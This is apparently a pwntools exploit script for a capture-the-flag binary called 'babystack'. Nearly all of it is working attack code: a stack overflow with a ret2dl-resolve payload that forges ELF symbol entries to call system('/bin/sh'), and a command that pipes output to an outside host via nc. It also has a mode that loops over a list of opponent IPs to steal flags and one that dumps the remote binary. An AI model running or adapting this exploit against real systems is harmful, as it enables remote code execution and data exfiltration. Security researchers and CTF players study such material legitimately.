#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
from pwn import *
import time
import os
from hashlib import sha256

# 调试模式 会使用gdb联调
DEBUG = 0

# 啰嗦模式
VERBOSE = 1

# 0 local 1 remote 2 attack
MODE = 1

# 程序名
PROGRAM_NAME = './babystack'

# libc
REMOTE_LIBC = False

# 地址
IP = '202.120.7.202'

PORT = 6666
#IP = '127.0.0.1'
#PORT = 17001

# gdb调试配置 根据机器更改
# context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']
context.arch = 'i386'

# 是否开启 aslr
context.aslr = True


# export LD_LIBRARY_PATH=/home/plusls/Desktop/kanxuectf/4-BPG-club
# LD_PRELOAD
# socat tcp-l:8888,reuseaddr,fork system:LD_PRELOAD=./libc.so.6 ./club

# 地址 程序常量
system_offset = 0
_IO_list_all_offset = 0
__malloc_hook_offset = 0
one_gadget_offset = 0



def set_breakpoint(breakpoint_list, pie=False):
    '''生成设置断点的命令'''
    ret = ''
    offset = 0
    if pie is True:
        if context.aslr is True:
            return ''
        if context.arch == 'amd64': # 64位下gdb关闭aslr后基址为 0x555555554000
            offset = 0x555555554000
        elif context.arch == 'i386': # 32位为0x56555000
            offset = 0x56555000
    for breakpoint in breakpoint_list:
        ret += 'b *%d\n' % (breakpoint + offset)
    return ret


def get_shell(ip='', port=0):
    # 设置断点
    
    breakpoint = set_breakpoint([0x08048456], pie=False)
    #breakpoint = ''
    gdbscript = breakpoint + 'c\n'
    if VERBOSE:
        context.log_level = 'debug'

    global system_offset, _IO_list_all_offset, __malloc_hook_offset, one_gadget_offset
    if REMOTE_LIBC:
        env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.remote")}
        
        system_offset = 0x45390
        _IO_list_all_offset = 0x3c5520
        __malloc_hook_offset = 0x3c4b10
        __free_hook_offset = 0x3c67a8
        one_gadget_offset =0x04523E
        libc_ptr_offset = 0x3c4b31
        heap_ptr_offset = 0x240
        fastbin_0x70_offset = 0x30
        main_arena_offset = 0x3c4b20
    else:
        env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.local")}
        env = {}
        
        system_offset = 0x456a0
        _IO_list_all_offset = 0x3c2500
        __malloc_hook_offset = 0x3c1af0
        __free_hook_offset = 0x3c3788
        one_gadget_offset = 0x0F24CB
        libc_ptr_offset = 0x3c1b31
        heap_ptr_offset = 0x240
        main_arena_offset = 0x3c1b00
        fastbin_0x70_offset = 0x30
        



    if MODE == 0:
        if DEBUG:
            # debug
            program = gdb.debug((PROGRAM_NAME, ), gdbscript=gdbscript, env=env)
            # 等待输入后继续运行
            raw_input('')
            # gdb.attach(program)
        else:
            # 直接运行程序
            program = process((PROGRAM_NAME, ), env=env)
            sol = ''
    else:
        # 远程
        program = remote(ip, port)
        #program = process('./pow.py')
        
        chal = program.recvuntil('\n')[:-1]
        for i in xrange(0x100000000):
            if sha256(chal + p32(i)).digest().startswith('\0\0\0'):
                sol = p32(i)
                break
        #sol = 'fuck'
        program.send(sol)
        

    payload = ''    
    payload += (0x28+4) * 'a'
    payload += p32(0x08048300) # read
    payload += p32(0x0804843B) # 
    #payload += p32(0x080484E9) # pop 3 arg
    payload += p32(0) # fd
    payload += p32(0x0804A024) # buf
    payload += p32(40) # len

    l1 = len(payload)

    main_elf = ELF('./babystack')
    #payload += '/bin/sh'.ljust(8, '\x00') # 0x0804A024 -> 0x0804A02c
    payload += '/bin/sh'.ljust(8, '\x00') # 0x0804A024 -> 0x0804A02c
    
    #payload += 'fuck'.ljust(8, '\x00') # 0x0804A024 -> 0x0804A02c
    
    # fake ELF Symbol Table
    payload += p32(0x1e10) + p32(0) + p32(0) + p32(0x12) # [offset, 0, 0, 0x12] offset = 0x0804A02c + 16 - 0x804822C = 0x1e10
    payload += 'system\x00\x00'
    payload += p32(0x804A020) + p32(0x1e607) # [addr, offset] offset = ((0x0804A02c - 0x80481CC) << 4) + 7 = 0x1e607
    #program.sendline(payload)

    l2 = len(payload) - l1

    # plt offset = hex(0x0804A02c + 16 + 8 - 0x80482B0)=0x1d94

    #raw_input()
    payload += (0x28+4) * 'a'
    payload += p32(0x080482F0) # plt 0
    payload += p32(0x1d94) # fd
    payload += p32(0x0804843B) #
    payload += p32(0x0804A024) #  binsh
    payload += 'a'*4
    #payload += 'curl baidu.com && exit\n'
   # payload += 'ls -al|nc 139.199.155.42 10086\n'
    payload += 'pwd|nc 139.199.155.42 10086\n'
    
    
    

    l3 = len(payload) - l2 - l1
    log.info('%d %d %d 0x%x' % (l1, l2, l3, len(payload)))
    
    log.info(repr(payload.ljust(0x100, '\n')))
    payload = payload.ljust(0x100, '\n')
    fp = open('out.data', 'wb')
    fp.write(payload)
    fp.close()
    program.sendline(payload)
    return program

def attack(sleep_time=10):
    # 打全场 线下赛使用
    ip_list = ['172.16.20.4', '172.16.20.5',
               '172.16.20.7', '172.16.20.9', '172.16.20.11']
    # ip_list = ['127.0.0.1']
    while True:
        for ip in ip_list:
            try:
                program = get_shell(ip=ip, port=2111)
                program.sendline('cd /home/tsctf/flag')
                program.sendline('cat flag')
                flag = program.recvall(timeout=1)[-32:]
                log.info('flag=' + flag)
                #submit_flag(ip, '2', flag)
                program.close()
            except:
                print('FUCK')
        time.sleep(sleep_time)


def main():
    if MODE == 0:  # local
        program = get_shell()
        program.interactive()
    elif MODE == 1:  # remote
        program = get_shell(ip=IP, port=PORT)
        #program = get_shell(ip='127.0.0.1', port=17001)
        
        program.interactive()
    elif MODE == 2:  # attack
        attack(sleep_time=10)
    elif MODE == 3: # 取回二进制文件
        program = get_shell(ip=IP, port=PORT)
        program.recv(timeout=1)
        program.sendline('cat pwn2')
        program.sendline('exit')
        
        recv_data = program.recvall()
        fp = open('dump', 'wb')
        fp.write(recv_data)
        fp.close()



if __name__ == '__main__':
    main()
